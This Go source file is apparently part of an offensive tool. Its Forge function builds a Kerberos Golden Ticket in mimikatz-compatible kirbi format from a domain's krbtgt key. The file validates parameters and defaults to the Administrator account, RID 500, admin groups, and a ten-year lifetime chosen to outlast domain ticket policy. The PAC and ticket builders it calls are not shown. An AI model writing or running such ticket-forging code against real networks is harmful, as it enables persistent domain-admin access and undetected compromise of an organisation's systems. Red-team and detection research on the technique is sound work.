package goldenticket

import (
	"fmt"
	"strings"
	"time"
)

// Forge builds a Golden Ticket given Params and returns the kirbi
// (KRB-CRED ASN.1) byte stream. The kirbi is the same format mimikatz
// emits with `kerberos::golden /ticket:foo.kirbi` and is directly
// loadable by `kerberos::ptt foo.kirbi` or by Submit (Windows-only).
//
// Forge runs cross-platform — the Windows-specific submission to the
// LSA ticket cache lives in Submit (inject_windows.go).
//
// On error returns one of: ErrInvalidParams, ErrPACBuild,
// ErrTicketBuild — wrapped with %w so callers can errors.Is for
// dispatch. The wrapped chain carries the underlying detail.
func Forge(p Params) ([]byte, error) {
	n, err := p.normalize()
	if err != nil {
		return nil, err
	}
	pacBytes, err := buildPAC(n)
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrPACBuild, err)
	}
	kirbi, err := buildKirbi(n, pacBytes)
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrTicketBuild, err)
	}
	return kirbi, nil
}

// normalizedParams is the post-defaults internal representation. It
// is not exported — every Forge call goes through normalize() so the
// downstream builders see canonical, validated data.
type normalizedParams struct {
	Domain        string // upper-case canonical FQDN (e.g. CORP.EXAMPLE.COM)
	DomainSID     string // S-1-5-21-... validated form
	User          string
	UserRID       uint32
	Groups        []uint32
	Hash          Hash
	PrincipalName string // canonical "krbtgt/<DOMAIN>" form when defaulted
	Lifetime      time.Duration
	Now           time.Time
	LogonID       uint64
}

// normalize fills in defaults, validates required fields, and
// canonicalizes the representation. Returns ErrInvalidParams wrapped
// with the specific reason.
func (p Params) normalize() (normalizedParams, error) {
	if p.Domain == "" {
		return normalizedParams{}, fmt.Errorf("%w: Domain is required", ErrInvalidParams)
	}
	if p.DomainSID == "" {
		return normalizedParams{}, fmt.Errorf("%w: DomainSID is required", ErrInvalidParams)
	}
	if !strings.HasPrefix(p.DomainSID, "S-1-5-21-") {
		return normalizedParams{}, fmt.Errorf("%w: DomainSID %q does not look like an AD domain SID (expected S-1-5-21-...)", ErrInvalidParams, p.DomainSID)
	}
	if len(p.Hash.Bytes) == 0 {
		return normalizedParams{}, fmt.Errorf("%w: Hash.Bytes is required (krbtgt long-term key)", ErrInvalidParams)
	}
	if want := p.Hash.Type.keyLen(); want == 0 {
		return normalizedParams{}, fmt.Errorf("%w: Hash.Type %d not recognized (want RC4HMAC/AES128CTS/AES256CTS)", ErrInvalidParams, p.Hash.Type)
	} else if len(p.Hash.Bytes) != want {
		return normalizedParams{}, fmt.Errorf("%w: Hash.Bytes len=%d, want %d for etype %s", ErrInvalidParams, len(p.Hash.Bytes), want, p.Hash.Type)
	}

	n := normalizedParams{
		Domain:        strings.ToUpper(p.Domain),
		DomainSID:     p.DomainSID,
		User:          p.User,
		UserRID:       p.UserRID,
		Groups:        p.Groups,
		Hash:          p.Hash,
		PrincipalName: p.PrincipalName,
		Lifetime:      p.Lifetime,
		Now:           p.Now,
		LogonID:       p.LogonID,
	}
	if n.User == "" {
		n.User = "Administrator"
	}
	if n.UserRID == 0 {
		n.UserRID = 500
	}
	if len(n.Groups) == 0 {
		n.Groups = append([]uint32{}, DefaultAdminGroups...)
	}
	if n.PrincipalName == "" {
		n.PrincipalName = "krbtgt/" + n.Domain
	}
	if n.Lifetime <= 0 {
		// 10 years — historical mimikatz default. Well over any AD
		// MaxTicketLifetime policy, which is the operational point.
		n.Lifetime = 10 * 365 * 24 * time.Hour
	}
	if n.Now.IsZero() {
		n.Now = time.Now().UTC()
	} else {
		n.Now = n.Now.UTC()
	}
	return n, nil
}
